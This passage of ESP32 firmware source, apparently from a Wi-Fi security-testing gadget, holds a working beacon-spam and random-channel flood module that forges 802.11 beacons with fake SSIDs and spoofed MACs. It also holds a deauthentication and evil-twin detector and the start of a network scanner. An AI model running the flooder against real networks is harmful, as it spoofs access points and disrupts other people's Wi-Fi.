    s_sdSsidCount = n;
    s_usingSdList = true;
    Serial.printf("[Beacon] loaded %d SSID(s) from /ssid_list.txt\n", n);
  } else {
    Serial.println("[Beacon] /ssid_list.txt empty; using built-in SSID list");
  }
  return n;
}

uint8_t spamchannel = 1;
bool    spam        = false;
int     y_offset    = 20;

static constexpr int kSpamBodyTop = 37;
static constexpr int kMaxChannel = 13;
static uint8_t s_ssidIdx = 0;
static uint8_t s_beaconPkt[128];

static bool spamYFits(int y, int h = 10) {
  return y + h <= wifiContentBottom();
}

static int spamMaxListLines() {
  const int startY = 130 + y_offset;
  const int lineH = 10;
  const int avail = wifiContentBottom() - startY;
  if (avail <= 0) {
    return 0;
  }
  return avail / lineH;
}

static void spamClearBody() {
  const int bodyH = wifiContentBottom() - kSpamBodyTop;
  if (bodyH > 0) {
    tft.fillRect(0, kSpamBodyTop, tft.width(), bodyH, TFT_BLACK);
  }
}

static void spamDrawIdleHint() {
  if (!spamYFits(30 + y_offset, 10)) {
    return;
  }
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(UI_WARN, TFT_BLACK);
  tft.setCursor(2, 30 + y_offset);
  tft.print("[!] Press [Select] to start");
}

static void spamUpdateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Layout remapeado: LEFT=Exit, UP=Ch+, DOWN=Ch-, SELECT=Start/Stop, RIGHT=Flood.
  setTouchNavLabels("Exit", "Ch-", spam ? "Stop" : "Start", "Ch+", "Flood");
  redrawTouchButtonBar();
}

static void spamRedrawChrome() {
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawFastHLine(0, 35, tft.width(), UI_LINE);
}

static void spamDrawToolbarStatus() {
  tft.setTextFont(1);
  tft.fillRect(35, 20, 95, 16, DARK_GRAY);
  tft.setTextSize(1);

  tft.setTextColor(UI_TEXT, DARK_GRAY);
  tft.setCursor(35, 24);
  tft.print("Ch:");
  tft.setTextColor(UI_ICON, DARK_GRAY);
  tft.print(spamchannel);

  tft.setTextColor(spam ? UI_OK : UI_TEXT, DARK_GRAY);
  tft.setCursor(70, 24);
  tft.print(spam ? "Enabled " : "Disabled");

  spamRedrawChrome();
}

static uint8_t lastSpamChannel = 0xFF;
static bool    lastSpamState   = !false;

// Build a valid beacon with variable SSID length. The old fixed 57-byte template
// assumed SSID len == 6, so longer names overwrote rates/channel and clients
// dropped most frames (only a few APs appeared).
static uint16_t buildSpamBeacon(const char* ssid, uint8_t channel, uint8_t* out,
                                uint16_t outMax, const uint8_t mac[6]) {
  if (!ssid || !out || !mac || outMax < 64) {
    return 0;
  }
  const uint8_t ssidLen = (uint8_t)min((size_t)32, strlen(ssid));
  const uint16_t need = (uint16_t)(24 + 12 + 2 + ssidLen + 10 + 3);
  if (need > outMax) {
    return 0;
  }

  uint16_t pos = 0;
  out[pos++] = 0x80;  // Beacon
  out[pos++] = 0x00;
  out[pos++] = 0x00;
  out[pos++] = 0x00;
  memset(&out[pos], 0xFF, 6);  // DA broadcast
  pos += 6;
  memcpy(&out[pos], mac, 6);   // SA
  pos += 6;
  memcpy(&out[pos], mac, 6);   // BSSID
  pos += 6;
  out[pos++] = 0xc0;  // seq/frag
  out[pos++] = 0x6c;

  // Fixed params: timestamp + beacon interval + capability
  memset(&out[pos], 0, 8);
  pos += 8;
  out[pos++] = 0x64;  // interval 100 TU
  out[pos++] = 0x00;
  out[pos++] = 0x01;  // ESS
  out[pos++] = 0x04;

  out[pos++] = 0x00;  // SSID IE
  out[pos++] = ssidLen;
  memcpy(&out[pos], ssid, ssidLen);
  pos += ssidLen;

  static const uint8_t rates[] = {
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c
  };
  memcpy(&out[pos], rates, sizeof(rates));
  pos += sizeof(rates);

  out[pos++] = 0x03;  // DS Parameter Set
  out[pos++] = 0x01;
  out[pos++] = channel;
  return pos;
}

void handleLeftButton() {
  spamchannel = (spamchannel <= 1) ? kMaxChannel : (uint8_t)(spamchannel - 1);
}

void handleRightButton() {
  spamchannel = (spamchannel >= kMaxChannel) ? 1 : (uint8_t)(spamchannel + 1);
}

void handleSelectButton() {
  spam = !spam;
}

void output() {
  spamClearBody();

  tft.setTextFont(1);
  tft.setTextSize(1);

  auto printLine = [](int y, uint16_t color, const String& text) {
    if (!spamYFits(y, 10)) {
      return;
    }
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(2, y);
    tft.print(text);
  };

  printLine(30 + y_offset, UI_WARN, "[!] Preparing");
  for (int i = 0; i < 3; i++) {
    if (spamYFits(30 + y_offset, 10)) {
      tft.print(".");
    }
    delay(random(200, 400));
  }

  {
    const int y = 50 + y_offset;
    if (spamYFits(y, 10)) {
      tft.setTextColor(UI_TEXT, TFT_BLACK);
      tft.setCursor(2, y);
      tft.print("[*] Configuring channel to (");
      tft.setTextColor(UI_ICON, TFT_BLACK);
      tft.print(spamchannel);
      tft.setTextColor(UI_TEXT, TFT_BLACK);
      tft.print(")");
    }
  }
  delay(200);

  printLine(70 + y_offset, UI_WARN, "[!] SSID list ready");
  delay(150);

  printLine(80 + y_offset, UI_WARN, "[!] Cycling all SSIDs");
  delay(150);

  printLine(110 + y_offset, UI_TEXT, "[*] Starting broadcast");
  delay(150);

  const int maxLines = min(activeSsidCount(), min(18, spamMaxListLines()));
  for (int i = 0; i < maxLines; i++) {
    const int y = 130 + i * 10 + y_offset;
    if (!spamYFits(y, 10)) {
      break;
    }
    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setCursor(2, y);
    tft.print("[+] ");
    tft.print(activeSsid(i));
    delay(40);
  }

  maintainTouchNavBar();
}

void spammer() {
  if (spamchannel < 1 || spamchannel > kMaxChannel) {
    spamchannel = 1;
  }

  const int count = activeSsidCount();
  const int idx = s_ssidIdx % count;
  s_ssidIdx = (uint8_t)((s_ssidIdx + 1) % count);
  const char* ssid = activeSsid(idx);

  // Stable locally-administered MAC per SSID index so phones keep distinct APs.
  uint8_t mac[6] = {
    0x02,
    0xDE,
    0xAD,
    (uint8_t)(0x10 + (idx % 200)),
    (uint8_t)(0x20 + ((idx * 3) % 200)),
    (uint8_t)(0x30 + ((idx * 7) % 200))
  };

  const uint16_t len = buildSpamBeacon(ssid, spamchannel, s_beaconPkt, sizeof(s_beaconPkt), mac);
  if (len == 0) {
    return;
  }

  esp_wifi_set_channel(spamchannel, WIFI_SECOND_CHAN_NONE);
  // Burst a few copies so scanners catch each SSID reliably.
  for (int n = 0; n < 3; n++) {
    (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
  }
}

void beaconSpam() {
    uint8_t channel;

    tft.setTextFont(1);
    tft.setTextSize(1);
    spamClearBody();
    if (spamYFits(30 + y_offset, 10)) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(2, 30 + y_offset);
      tft.print("[!!] Random flood mode");
    }
    if (spamYFits(50 + y_offset, 10)) {
      tft.setTextColor(UI_TEXT, TFT_BLACK);
      tft.setCursor(2, 50 + y_offset);
      tft.print("[!!] Press [Select] to stop");
    }
    // Enquanto o flood roda, SELECT para ELE (nao o spam normal) -- o rodapé
    // nao deve ficar mostrando "Start" (reflexo do estado do spam normal,
    // que esta false aqui).
    setTouchNavLabels("Exit", "Ch-", "Stop", "Ch+", "Flood");
    maintainTouchNavBar();

    delay(300);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
        Serial.printf("WiFi init failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
        Serial.printf("Storage set failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        Serial.printf("Mode set failed: %d\n", err);
        return;
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        Serial.printf("WiFi start failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Promiscuous set failed: %d\n", err);
        return;
    }

    uint8_t floodIdx = 0;
    while (true) {
        channel = (uint8_t)random(1, kMaxChannel + 1);
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        const char* ssid = activeSsid(floodIdx % activeSsidCount());
        floodIdx++;

        uint8_t mac[6] = {
          0x02,
          (uint8_t)random(256),
          (uint8_t)random(256),
          (uint8_t)random(256),
          (uint8_t)random(256),
          (uint8_t)random(256)
        };

        const uint16_t len = buildSpamBeacon(ssid, channel, s_beaconPkt, sizeof(s_beaconPkt), mac);
        if (len > 0) {
          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
        }

        delay(1);

      if (isButtonPressed(BTN_SELECT)) {
        break;
      }

    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {10, 190, 220};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back,
    bitmap_icon_start,
    bitmap_icon_nuke
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, 120, STATUS_BAR_HEIGHT, DARK_GRAY);
    tft.fillRect(120, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 120, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    spamRedrawChrome();
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          feature_exit_requested = true;
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          handleSelectButton();
          if (spam) {
            animationState = 4;
          } else {
            animationState = 0;
            activeIcon = -1;
          }
          break;
        case 2:
          beaconSpam();
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;

    case 4:
      if (spam) {
        if (millis() - lastSpamTime >= 10) {
          spammer();
          lastSpamTime = millis();
        }
      } else {
        animationState = 0;
        activeIcon = -1;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 0) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void beaconSpamSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  spam = false;
  s_ssidIdx = 0;

  // Load custom names from /ssid_list.txt on SD (falls back to built-in list).
  loadSsidListFromSd();
  if (spamchannel < 1 || spamchannel > kMaxChannel) {
    spamchannel = 1;
  }
  spamUpdateNavLabels();
  featureClearContent(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, true);
  redrawTouchButtonBar();

  setupTouchscreen();

  spamDrawIdleHint();

  tft.fillRect(0, 20, 120, 16, DARK_GRAY);
  tft.fillRect(120, 20, tft.width() - 120, 16, DARK_GRAY);

  lastSpamChannel = 0xFF;
  lastSpamState   = !spam;
  spamDrawToolbarStatus();

  esp_err_t err;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  err = esp_wifi_init(&cfg);
  if (err != ESP_OK) Serial.printf("WiFi init failed: %d\n", err);

  err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
  if (err != ESP_OK) Serial.printf("Storage set failed: %d\n", err);

  err = esp_wifi_set_mode(WIFI_MODE_AP);
  if (err != ESP_OK) Serial.printf("Mode set failed: %d\n", err);

  err = esp_wifi_start();
  if (err != ESP_OK) Serial.printf("WiFi start failed: %d\n", err);

  // Hidden SoftAP so WIFI_IF_AP raw TX is reliable.
  WiFi.softAP(".", nullptr, spamchannel, 1, 4);

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) Serial.printf("Promiscuous set failed: %d\n", err);

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
#endif

  uiDrawn = false;
  runUI();
  redrawTouchButtonBar();
}

void beaconSpamLoop() {

  // Layout remapeado: fisico LEFT sai (em vez do SELECT do meio). O slot da
  // barra de toque que mostra "Exit" agora e o da ESQUERDA (ver
  // spamUpdateNavLabels) -- isButtonPressed(BTN_LEFT) ja cobre esse toque
  // sozinho (fisico OU touch nav no mesmo slot), por isso NAO soma mais
  // isTouchNavButtonPressed(BTN_SELECT) aqui (aquele slot agora mostra
  // "Start/Stop" e tocar nele saia por engano).
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    feature_exit_requested = true;
    return;
  }

  runUI();
  updateStatusBar();
  spamRedrawChrome();

  // Layout remapeado (nomes das variaveis mantidos, so a origem mudou):
  //   btnLeftPress  (canal -) <- fisico DOWN
  //   btnRightPress (canal +) <- fisico UP
  //   btnSelectPress (start/stop) <- fisico SELECT (antes era o UP)
  //   btnDownPress  (flood)  <- fisico RIGHT (antes era o DOWN)
  btnLeftPress = isButtonPressed(BTN_DOWN);
  btnRightPress = isButtonPressed(BTN_UP);
  btnSelectPress = isButtonPressed(BTN_SELECT);
  btnDownPress = isButtonPressed(BTN_RIGHT);

  delay(10);

  // waitButtonReleased() (nao so delay(200)) consome a soltura real do botao
  // antes de deixar o loop ler o mesmo toque de novo -- senao um aperto um
  // pouco mais longo (>200ms, comum num toque humano normal) era lido como
  // 2 acoes (ex.: "sobe 2 canais" num unico aperto).
  if (btnLeftPress) {
    handleLeftButton();
    waitButtonReleased(BTN_DOWN);
  }
  if (btnRightPress) {
    handleRightButton();
    waitButtonReleased(BTN_UP);
  }
  if (btnDownPress) {
    // Random flood mode (same as toolbar nuke).
    spam = false;
    lastSpamState = false;
    spamDrawToolbarStatus();
    spamUpdateNavLabels();
    beaconSpam();
    // Wait for Select release so exiting flood doesn't exit the feature.
    while (isButtonPressed(BTN_SELECT)) {
      delay(10);
    }
    waitButtonReleased(BTN_RIGHT);
    delay(150);
    spamClearBody();
    spamDrawIdleHint();
    spamUpdateNavLabels();
    spamDrawToolbarStatus();
  }
  if (btnSelectPress) {
    const bool wasRunning = spam;
    handleSelectButton();
    waitButtonReleased(BTN_SELECT);
    if (!wasRunning && spam) {
      spamClearBody();
      output();
      spamUpdateNavLabels();
    } else if (wasRunning && !spam) {
      spamClearBody();
      spamDrawIdleHint();
      spamUpdateNavLabels();
    }
  }

  if (lastSpamChannel != spamchannel || lastSpamState != spam) {
    spamDrawToolbarStatus();
    if (lastSpamState != spam) {
      spamUpdateNavLabels();
    }
    lastSpamChannel = spamchannel;
    lastSpamState   = spam;
  }

  // Keep transmitting while enabled — do not require holding UP.
  // (Layout remapeado: mesmo criterio de saida do topo da funcao — so o LEFT
  // fisico, que ja cobre o toque no slot "Exit" via isButtonPressed. NAO mais
  // o SELECT fisico, que agora e o start/stop.)
  if (spam) {
    if (feature_exit_requested || isButtonPressed(BTN_LEFT)) {
      spam = false;
      return;
    }
    spammer();
  }
}
}

namespace DeauthDetect {

#define LINE_HEIGHT 12
static constexpr int DEAUTH_TERM_CAPACITY = 24;

static int deauthVisibleLines() {
  return min(DEAUTH_TERM_CAPACITY, wifiMaxLinesInZone(45, LINE_HEIGHT));
}

#define MAX_NETWORKS ESP32DIV_MAX_WIFI_NETWORKS
#define MAX_CHANNELS 14
#define MAX_SSID_LENGTH 8

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

bool stopScan = false;
bool exitMode = false;

String terminalBuffer[DEAUTH_TERM_CAPACITY];
uint16_t colorBuffer[DEAUTH_TERM_CAPACITY];
int lineIndex = 0;

int deauth[MAX_NETWORKS] = {0};
String ssidLists[MAX_NETWORKS];
uint8_t macList[MAX_NETWORKS][6];

static volatile bool deauthAlertPending = false;
static volatile int deauthAlertIndex = -1;

enum class DeauthPhase : uint8_t { Listen, Scanning };
static DeauthPhase s_phase = DeauthPhase::Scanning;
static bool s_asyncScanActive = false;
static bool s_scanBannerShown = false;
static unsigned long s_listenUntilMs = 0;
static int s_knownNetworkCount = 0;

static int iconX[ICON_NUM] = {210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_power,
  bitmap_icon_go_back
};

void scrollTerminal() {
  const int cap = deauthVisibleLines();
  for (int i = 0; i < cap - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (!feature_active || exitMode) {
    return;
  }

  const int cap = deauthVisibleLines();
  if (lineIndex >= cap - 1) {
    scrollTerminal();
    lineIndex = cap - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < cap) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = UI_TEXT;
    lineIndex++;
  }

  const int bodyBottom = wifiContentBottom();
  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    if (yPos + LINE_HEIGHT > bodyBottom) {
      break;
    }
    tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!feature_active || stopScan || exitMode) return;

  wifi_promiscuous_pkt_t* packet = (wifi_promiscuous_pkt_t*) buf;
  if (!packet || !packet->payload) {
    return;
  }
  uint8_t* payload = packet->payload;

  if (type == WIFI_PKT_MGMT) {
    uint8_t frameType = payload[0];

    if (frameType == 0xC0) {
      uint8_t senderMAC[6];
      memcpy(senderMAC, payload + 10, 6);

      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (memcmp(senderMAC, macList[i], 6) == 0) {
          deauth[i]++;
          deauthAlertIndex = i;
          deauthAlertPending = true;
          break;
        }
      }
    }
  }
}

static void deauthFlushPendingAlert() {
  if (!deauthAlertPending) {
    return;
  }
  deauthAlertPending = false;
  const int i = deauthAlertIndex;
  if (i >= 0 && i < MAX_NETWORKS) {
    displayPrint("[!] Deauth Attack on: " + ssidLists[i], UI_WARN, true);
  }
}

static void deauthPopulateScanResults(int n) {
  s_knownNetworkCount = min(n, MAX_NETWORKS);
  for (int i = 0; i < s_knownNetworkCount; i++) {
    String fullSSID = WiFi.SSID(i);
    ssidLists[i] = fullSSID.substring(0, MAX_SSID_LENGTH);
    const uint8_t* bssid = WiFi.BSSID(i);
    if (bssid) {
      memcpy(macList[i], bssid, 6);
    } else {
      memset(macList[i], 0, 6);
    }

    displayPrint("[+] " + ssidLists[i] + (fullSSID.length() > MAX_SSID_LENGTH ? "..." : "") +
                 " | CH: " + String(WiFi.channel(i)) +
                 " | RSSI: " + String(WiFi.RSSI(i)), FEATURE_TEXT);
    if (exitMode || stopScan) {
      break;
    }
  }
}

void analyzeNetworks(int n) {
  displayPrint("[*] Checking for Suspicious Networks", UI_TEXT, true);

  for (int i = 0; i < n; i++) {
    if (exitMode) {
      return;
    }

    bool isDuplicate = false;
    bool isHidden = (ssidLists[i] == "");
    bool isWeirdChannel = WiFi.channel(i) > 13;

    for (int j = 0; j < n; j++) {
      if (i != j && ssidLists[i] == ssidLists[j] && memcmp(macList[i], macList[j], 6) != 0) {
        isDuplicate = true;
        break;
      }
    }

    if (isHidden) {
      displayPrint("[!] Hidden SSID Detected!", UI_WARN, true);
    }
    if (isDuplicate) {
      displayPrint("[!] Evil Twin: " + ssidLists[i], UI_WARN, true);
    }
    if (isWeirdChannel) {
      displayPrint("[!] Non-Standard Channel: " + String(WiFi.channel(i)), UI_WARN, true);
    }

    if (deauth[i] > 5) {
      displayPrint("[!!!] HIGH DEAUTH ATTACK on " + ssidLists[i] + " (" + String(deauth[i]) + " attacks)", UI_WARN, true);
    }
  }
}

static void deauthBeginListen() {
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  s_phase = DeauthPhase::Listen;
  s_listenUntilMs = millis() + 5000;
}

static void deauthAbortAsyncScan() {
  if (s_asyncScanActive) {
    (void)esp_wifi_scan_stop();
    WiFi.scanDelete();
    s_asyncScanActive = false;
  }
}

static void deauthStepScan() {
  if (stopScan) {
    deauthBeginListen();
    return;
  }

  if (!s_scanBannerShown) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.scanDelete();
    displayPrint("[*] Scanning WiFi networks", UI_TEXT, true);
    s_scanBannerShown = true;
  }

  if (!s_asyncScanActive) {
    const uint32_t dwell = wifiStaScanMsPerChannel();
    const int ret = WiFi.scanNetworks(true, true, false, dwell);
    if (ret == WIFI_SCAN_RUNNING) {
      s_asyncScanActive = true;
      return;
    }
    if (ret < 0) {
      s_scanBannerShown = false;
      deauthBeginListen();
      return;
    }
    deauthPopulateScanResults(ret);
    if (!stopScan && ret > 0) {
      analyzeNetworks(ret);
    }
    s_scanBannerShown = false;
    deauthBeginListen();
    return;
  }

  const int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) {
    if (feature_exit_requested || featureExitButtonPressed()) {
      exitMode = true;
      deauthAbortAsyncScan();
    }
    return;
  }

  s_asyncScanActive = false;
  if (n < 0) {
    s_scanBannerShown = false;
    deauthBeginListen();
    return;
  }

  deauthPopulateScanResults(n);
  if (!stopScan && n > 0) {
    analyzeNetworks(n);
  }
  s_scanBannerShown = false;
  deauthBeginListen();
}

static void deauthStepListen() {
  if (!stopScan && millis() >= s_listenUntilMs) {
    s_phase = DeauthPhase::Scanning;
    s_scanBannerShown = false;
  }
}

static void deauthTeardown() {
  deauthAbortAsyncScan();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.scanDelete();
  WiFi.disconnect();
  stopScan = false;
  exitMode = false;
  lineIndex = 0;
  s_phase = DeauthPhase::Scanning;
  s_asyncScanActive = false;
  s_scanBannerShown = false;
  s_knownNetworkCount = 0;
  deauthAlertPending = false;
  deauthAlertIndex = -1;
}

static bool uiDrawn = false;

void runUI() {

    tft.drawFastHLine(0, 19, tft.width(), UI_LINE);

    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_start,
        bitmap_icon_go_back
    };

    if (!uiDrawn) {
        tft.setTextFont(1);
        tft.fillRect(0, 20, 140, 16, DARK_GRAY);
        tft.setTextColor(UI_TEXT, DARK_GRAY);
        tft.setTextSize(1);
        tft.setCursor(35, 24);
        tft.print("Scanning WiFi");

        tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
        tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);

        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, UI_ICON);
            }
        }
        tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, UI_ICON);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                    displayPrint("[!] Scanning Stopped", UI_WARN, true);
                    displayPrint("[!] Press [Select] to Exit", UI_WARN, false);
                    stopScan = true;
                    animationState = 0;
                    activeIcon = -1;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50;

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        int x, y;
        if (feature_active && readTouchXY(x, y)) {
            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {

                            if (i == 1) {
                                displayPrint("[!] Scanning Stopped", UI_WARN, true);
                                stopScan = true;
                                exitMode = true;
                            } else {

                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                                animationState = 1;
                                activeIcon = i;
                                lastAnimationTime = millis();
                            }
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void deauthdetectSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  setTouchNavLabels("Back", nullptr, "Pause", nullptr, nullptr);
  stopScan = false;
  exitMode = false;
  lineIndex = 0;
  uiDrawn = false;
  deauthAlertPending = false;
  deauthAlertIndex = -1;
  s_asyncScanActive = false;
  s_scanBannerShown = false;
  s_knownNetworkCount = 0;
  s_phase = DeauthPhase::Listen;
  s_listenUntilMs = millis() + 600;

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  deauthAbortAsyncScan();

  memset(deauth, 0, sizeof(deauth));
  memset(macList, 0, sizeof(macList));
  for (int i = 0; i < DEAUTH_TERM_CAPACITY; i++) {
    terminalBuffer[i] = "";
    colorBuffer[i] = TFT_BLACK;
  }

  featureClearContent(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, true);
  redrawTouchButtonBar();

  WiFi.scanDelete();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
#endif

  setupTouchscreen();

  uiDrawn = false;
  runUI();
  displayPrint("[*] Starting deauth monitor", UI_TEXT, false);
  redrawTouchButtonBar();
}

void deauthdetectLoop() {

  // LEFT exits (matches every other feature's "back" convention); SELECT
  // toggles pause/resume instead of exiting -- reuses the existing stopScan
  // flag, which snifferCallback() already gates on.
  if (feature_active && isButtonPressedEdge(BTN_LEFT)) {
    exitMode = true;
  }
  if (feature_active && isButtonPressedEdge(BTN_SELECT)) {
    stopScan = !stopScan;
    setTouchNavLabels("Back", nullptr, stopScan ? "Play" : "Pause", nullptr, nullptr);
    displayPrint(stopScan ? "[!] Paused" : "[*] Resumed", UI_WARN, true);
  }

  runUI();
  deauthFlushPendingAlert();
  updateStatusBar();
  maintainTouchNavBar();
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);

  if (exitMode) {
    deauthTeardown();
    feature_exit_requested = true;
    return;
  }

  if (!stopScan) {
    if (s_phase == DeauthPhase::Scanning) {
      deauthStepScan();
    } else {
      deauthStepListen();
    }
  }

  delay(20);
}
}

namespace WifiScan {

#define TFT_WIDTH 240
#define TFT_HEIGHT 320

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
bool isScanning = false;
bool exitRequested = false;

static TaskHandle_t bgScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static const uint32_t BG_SCAN_INTERVAL_MS = 15000;

static const uint32_t BG_BOOT_GRACE_MS = 6000;
static volatile bool bgScanRunning = false;
static volatile bool fgWifiScanInProgress = false;
static uint32_t bgBootMs = 0;

/** Stop an in-flight scan started by the background task only — never abort foreground/manual scans. */
